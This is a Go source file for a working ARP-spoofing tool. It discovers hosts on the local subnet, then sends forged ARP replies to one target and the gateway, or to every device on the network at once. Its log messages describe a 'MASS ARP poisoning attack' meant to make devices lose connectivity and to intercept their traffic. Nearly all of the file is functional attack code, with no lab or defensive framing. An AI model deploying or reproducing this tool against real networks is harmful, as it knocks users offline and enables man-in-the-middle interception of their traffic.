package arpspoofing

import (
	"bytes"
	"fmt"
	"net"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// Host represents a discovered network host
type Host struct {
	IP  net.IP
	MAC net.HardwareAddr
}

func ScanNetwork() ([]Host, *net.Interface, net.IP, error) {
	iface, ipNet, ip, err := getInternetIfaceAndCIDRv4()
	if err != nil {
		return nil, nil, nil, err
	}

	fmt.Printf("Scanning network (ARP/pcap): %s on interface %s\n", ipNet.String(), iface.Name)

	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
	if err != nil {
		return nil, nil, nil, err
	}
	defer handle.Close()

	// Capture only ARP replies
	_ = handle.SetBPFFilter("arp and arp[6:2] = 2")

	alive := make(map[string]net.HardwareAddr)
	var aliveMu sync.Mutex

	stop := make(chan struct{})

	var snifferWG sync.WaitGroup
	snifferWG.Add(1)

	timeStart := time.Now()

	// Sniffer goroutine
	go func() {
		defer snifferWG.Done()
		src := gopacket.NewPacketSource(handle, handle.LinkType())
		for {
			select {
			case <-stop:
				return
			case pkt, ok := <-src.Packets():
				if !ok {
					return
				}
				arpLayer := pkt.Layer(layers.LayerTypeARP)
				if arpLayer == nil {
					continue
				}
				arpPkt := arpLayer.(*layers.ARP)
				if arpPkt.Operation != layers.ARPReply {
					continue
				}
				senderIP := net.IP(arpPkt.SourceProtAddress).To4()
				senderMAC := net.HardwareAddr(arpPkt.SourceHwAddress)
				if senderIP == nil || !ipNet.Contains(senderIP) {
					continue
				}

				aliveMu.Lock()
				alive[senderIP.String()] = senderMAC
				aliveMu.Unlock()
			}
		}
	}()

	// Send ARP requests
	ips := hosts(ipNet)
	srcMAC := iface.HardwareAddr
	dstMAC := net.HardwareAddr{0xff, 0xff, 0xff, 0xff, 0xff, 0xff} // broadcast

	// Send multiple rounds of ARP requests for reliability
	// More rounds with delays helps wake up sleeping devices
	numRounds := 5
	for round := 0; round < numRounds; round++ {
		if round > 0 {
			time.Sleep(300 * time.Millisecond) // pause between rounds
		}

		for _, targetIP := range ips {
			// Skip ourselves
			if targetIP.Equal(ip) {
				continue
			}

			frame, err := buildARPRequest(srcMAC, ip, targetIP)
			if err != nil {
				continue
			}
			_ = handle.WritePacketData(appendEthernet(dstMAC, srcMAC, frame))
		}
	}

	// Give replies a moment to arrive
	time.Sleep(10 * time.Second)
	close(stop)
	snifferWG.Wait()

	aliveMu.Lock()
	defer aliveMu.Unlock()

	// Convert map to Host slice
	hosts := make([]Host, 0, len(alive))
	for ipStr, mac := range alive {
		fmt.Printf("Host alive: %-15s  MAC: %s\n", ipStr, mac)
		hosts = append(hosts, Host{
			IP:  net.ParseIP(ipStr),
			MAC: mac,
		})
	}

	fmt.Printf("time to took %s\n", time.Since(timeStart))

	fmt.Println("Scan complete.")

	return hosts, iface, ip, nil
}

// PoisonDevice performs ARP poisoning to cut off a target device from the network
// It poisons both the target and the gateway to intercept all traffic between them
func PoisonDevice(targetIP, gatewayIP net.IP, targetMAC, gatewayMAC net.HardwareAddr, iface *net.Interface, duration time.Duration, stopChan <-chan struct{}) error {
	fmt.Printf("\n[*] Starting ARP poisoning attack\n")
	fmt.Printf("[*] Target: %s (%s)\n", targetIP, targetMAC)
	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)

	if duration > 0 {
		fmt.Printf("[*] Duration: %s\n", duration)
	} else {
		fmt.Printf("[*] Duration: indefinite (press Ctrl+C to stop)\n")
	}

	// Open pcap handle
	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
	if err != nil {
		return fmt.Errorf("failed to open pcap: %w", err)
	}
	defer handle.Close()

	// Build the poisoned ARP replies
	// Poison 1: Tell target that gateway is at our MAC
	poisonToTarget, err := buildARPReply(iface.HardwareAddr, gatewayIP, targetMAC, targetIP)
	if err != nil {
		return fmt.Errorf("failed to build ARP reply to target: %w", err)
	}

	// Poison 2: Tell gateway that target is at our MAC
	poisonToGateway, err := buildARPReply(iface.HardwareAddr, targetIP, gatewayMAC, gatewayIP)
	if err != nil {
		return fmt.Errorf("failed to build ARP reply to gateway: %w", err)
	}

	// Wrap in Ethernet frames
	frameToTarget := appendEthernet(targetMAC, iface.HardwareAddr, poisonToTarget)
	frameToGateway := appendEthernet(gatewayMAC, iface.HardwareAddr, poisonToGateway)

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var timeoutChan <-chan time.Time
	if duration > 0 {
		timeoutChan = time.After(duration)
	}

	fmt.Println("[*] Poisoning started... Target should lose connectivity")

	packetCount := 0
	for {
		select {
		case <-stopChan:
			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets.\n", packetCount)
			return nil
		case <-timeoutChan:
			fmt.Printf("\n[*] Duration expired. Sent %d poison packets.\n", packetCount)
			return nil
		case <-ticker.C:
			// Send poison to target
			if err := handle.WritePacketData(frameToTarget); err != nil {
				fmt.Printf("[!] Error sending to target: %v\n", err)
			}

			// Send poison to gateway
			if err := handle.WritePacketData(frameToGateway); err != nil {
				fmt.Printf("[!] Error sending to gateway: %v\n", err)
			}

			packetCount += 2
			if packetCount%20 == 0 {
				fmt.Printf("[*] Sent %d poison packets...\n", packetCount)
			}
		}
	}
}

// PoisonAllDevices poisons all devices on the network simultaneously
// Each device is poisoned in its own goroutine
func PoisonAllDevices(hosts []Host, gatewayIP net.IP, gatewayMAC net.HardwareAddr, myIP net.IP, iface *net.Interface, duration time.Duration, stopChan <-chan struct{}) error {
	fmt.Printf("\n[*] Starting MASS ARP poisoning attack\n")
	fmt.Printf("[*] Gateway: %s (%s)\n", gatewayIP, gatewayMAC)
	fmt.Printf("[*] Attacker MAC: %s\n", iface.HardwareAddr)
	fmt.Printf("[*] Targets: %d devices\n", len(hosts)-2) // Exclude self and gateway

	if duration > 0 {
		fmt.Printf("[*] Duration: %s\n", duration)
	} else {
		fmt.Printf("[*] Duration: indefinite (press Ctrl+C to stop)\n")
	}

	// Open pcap handle
	handle, err := pcap.OpenLive(iface.Name, 65536, false, 500*time.Millisecond)
	if err != nil {
		return fmt.Errorf("failed to open pcap: %w", err)
	}
	defer handle.Close()

	// Prepare poison packets for all targets
	type poisonTarget struct {
		ip            net.IP
		mac           net.HardwareAddr
		frameToTarget []byte
		frameToGW     []byte
	}

	var targets []poisonTarget

	for _, host := range hosts {
		// Skip ourselves and the gateway
		if host.IP.Equal(myIP) || host.IP.Equal(gatewayIP) {
			continue
		}

		// Build poisoned ARP replies for this target
		poisonToTarget, err := buildARPReply(iface.HardwareAddr, gatewayIP, host.MAC, host.IP)
		if err != nil {
			fmt.Printf("[!] Error building poison for %s: %v\n", host.IP, err)
			continue
		}

		poisonToGW, err := buildARPReply(iface.HardwareAddr, host.IP, gatewayMAC, gatewayIP)
		if err != nil {
			fmt.Printf("[!] Error building poison for %s: %v\n", host.IP, err)
			continue
		}

		targets = append(targets, poisonTarget{
			ip:            host.IP,
			mac:           host.MAC,
			frameToTarget: appendEthernet(host.MAC, iface.HardwareAddr, poisonToTarget),
			frameToGW:     appendEthernet(gatewayMAC, iface.HardwareAddr, poisonToGW),
		})

		fmt.Printf("[*] Added target: %s (%s)\n", host.IP, host.MAC)
	}

	if len(targets) == 0 {
		return fmt.Errorf("no valid targets to poison")
	}

	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	var timeoutChan <-chan time.Time
	if duration > 0 {
		timeoutChan = time.After(duration)
	}

	fmt.Printf("\n[*] Poisoning started... %d devices should lose connectivity\n", len(targets))

	packetCount := 0
	for {
		select {
		case <-stopChan:
			fmt.Printf("\n[*] Received stop signal. Sent %d poison packets to %d targets.\n", packetCount, len(targets))
			return nil
		case <-timeoutChan:
			fmt.Printf("\n[*] Duration expired. Sent %d poison packets to %d targets.\n", packetCount, len(targets))
			return nil
		case <-ticker.C:
			// Send poison packets to all targets
			for _, target := range targets {
				// Poison target
				if err := handle.WritePacketData(target.frameToTarget); err != nil {
					fmt.Printf("[!] Error poisoning %s: %v\n", target.ip, err)
				}

				// Poison gateway about this target
				if err := handle.WritePacketData(target.frameToGW); err != nil {
					fmt.Printf("[!] Error poisoning gateway for %s: %v\n", target.ip, err)
				}

				packetCount += 2
			}

			if packetCount%(20*len(targets)) == 0 {
				fmt.Printf("[*] Sent %d poison packets across %d targets...\n", packetCount, len(targets))
			}
		}
	}
}

func getInternetIfaceAndCIDRv4() (*net.Interface, *net.IPNet, net.IP, error) {
	// Ask the OS: "If I want to reach the internet, which local IP will you use?"
	// UDP dial doesn't need the remote to be reachable; it just selects a route.
	c, err := net.Dial("udp4", "8.8.8.8:80")
	if err != nil {
		return nil, nil, nil, fmt.Errorf("dial udp4: %w", err)
	}
	defer c.Close()

	localIP := c.LocalAddr().(*net.UDPAddr).IP.To4()
	if localIP == nil {
		return nil, nil, nil, fmt.Errorf("no local IPv4 selected")
	}

	// Map the chosen local IP back to an interface and its CIDR.
	ifaces, err := net.Interfaces()
	if err != nil {
		return nil, nil, nil, fmt.Errorf("list interfaces: %w", err)
	}

	for i := range ifaces {
		iface := &ifaces[i]

		// Must be up, and not loopback.
		if iface.Flags&net.FlagUp == 0 || iface.Flags&net.FlagLoopback != 0 {
			continue
		}

		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}

		for _, a := range addrs {
			ipNet, ok := a.(*net.IPNet)
			if !ok {
				continue
			}
			ip := ipNet.IP.To4()
			if ip == nil {
				continue
			}

			if ip.Equal(localIP) {
				return iface, ipNet, ip, nil
			}
		}
	}

	return nil, nil, nil, fmt.Errorf("could not find interface for local IP %s", localIP)
}

func hosts(ipNet *net.IPNet) []net.IP {
	out := make([]net.IP, 0)

	// Compute the network base address (IP & mask), and force IPv4 form.
	base := ipNet.IP.Mask(ipNet.Mask).To4()
	if base == nil {
		return out
	}

	// Make a working copy we can mutate as we iterate.
	cur := make(net.IP, len(base))
	copy(cur, base)

	// Walk all IPs in the subnet.
	for ipNet.Contains(cur) {
		// Store a copy of the current IP in the output slice.
		ipCopy := make(net.IP, len(cur))
		copy(ipCopy, cur)
		out = append(out, ipCopy)

		// Move to next IP.
		incIP(cur)
	}

	// Drop network & broadcast for typical subnets.
	if len(out) > 2 {
		return out[1 : len(out)-1]
	}
	return out
}

func incIP(ip net.IP) {
	for j := len(ip) - 1; j >= 0; j-- {
		ip[j]++
		if ip[j] != 0 {
			break
		}
	}
}

func buildARPRequest(srcMAC net.HardwareAddr, srcIP, dstIP net.IP) ([]byte, error) {
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPRequest,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte{0, 0, 0, 0, 0, 0},
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// buildARPReply builds an ARP reply packet for poisoning
// srcMAC: the MAC address to claim for srcIP
// srcIP: the IP address we're claiming to own
// dstMAC: the target MAC address to send the reply to
// dstIP: the target IP address
func buildARPReply(srcMAC net.HardwareAddr, srcIP net.IP, dstMAC net.HardwareAddr, dstIP net.IP) ([]byte, error) {
	arp := &layers.ARP{
		AddrType:          layers.LinkTypeEthernet,
		Protocol:          layers.EthernetTypeIPv4,
		HwAddressSize:     6,
		ProtAddressSize:   4,
		Operation:         layers.ARPReply,
		SourceHwAddress:   []byte(srcMAC),
		SourceProtAddress: []byte(srcIP.To4()),
		DstHwAddress:      []byte(dstMAC),
		DstProtAddress:    []byte(dstIP.To4()),
	}

	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true}
	if err := gopacket.SerializeLayers(buf, opts, arp); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}

// Minimal Ethernet II wrapper: dstMAC | srcMAC | ethertype(ARP=0x0806) | payload
func appendEthernet(dst, src net.HardwareAddr, payload []byte) []byte {
	var b bytes.Buffer
	b.Write(dst)
	b.Write(src)
	b.Write([]byte{0x08, 0x06}) // ARP ethertype
	b.Write(payload)
	return b.Bytes()
}
